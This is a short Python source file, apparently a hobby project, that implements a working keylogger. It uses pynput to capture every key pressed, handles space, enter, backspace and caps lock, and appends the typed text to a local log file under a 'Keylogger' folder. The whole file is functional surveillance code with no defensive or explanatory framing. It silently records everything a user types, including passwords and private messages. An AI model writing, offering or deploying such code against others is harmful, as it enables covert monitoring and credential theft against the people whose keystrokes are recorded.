from pynput.keyboard import Listener
import os



caps_lock_on = False
CHARS = "abcdefghijklmnñopqrstuvwxyzABCDEFGHIJLMNÑOPQRSTUVWXYZ0123456789!\"·$%&/()=?¿¡'`^[+*]´¨{ç},;.:-_<>|@#~¬\n\\ºª "
LOGS = "C:\\Programación\\Keylogger\\logs.txt"


def write(key):
    global caps_lock_on, LOGS
    key = str(key).replace("'", "")
    if key == "Key.space":
        key = " "
    elif key == "Key.caps_lock":
        caps_lock_on = not caps_lock_on
        key = ""
    elif key == "Key.enter":
        key = "\n"
    elif key == "Key.backspace":
        if os.path.getsize(LOGS) != 0:
            with open(LOGS, 'rb+') as filehandle:
                filehandle.seek(-1, os.SEEK_END)
                filehandle.truncate()
            key = ""
    if caps_lock_on:
        key = key.upper()
    if key in CHARS:
        open(LOGS, "a").write(key)


with Listener(on_press=write) as listener:
    listener.join()
